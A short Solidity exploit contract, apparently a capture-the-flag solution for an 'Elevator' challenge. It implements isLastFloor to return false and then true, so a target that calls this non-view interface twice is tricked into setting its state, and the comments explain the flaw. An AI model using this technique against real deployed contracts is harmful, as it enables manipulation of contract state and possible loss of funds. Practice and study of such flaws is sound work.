// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.19;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

interface Ielevator{
    function goTo(uint) external ;

}
// if first time, we shoud return false, so it can pass the first contract
// validation, then we should return true, and the contract will change its state variablo to true
/* we use the building contract interface here, which lets us 
use the sLastFloor function through an interface, we can change it 
because they forgot to set it in view mode. 
*/
contract Attack{
bool isSecondTime = false;
    function isLastFloor(uint) external returns(bool){
        if(isSecondTime){
            return true;
        }
        isSecondTime = true;
        return false;
    }

    function attack(address _target) external {
Ielevator elevator_ins = Ielevator(_target);
elevator_ins.goTo(1);

    }

}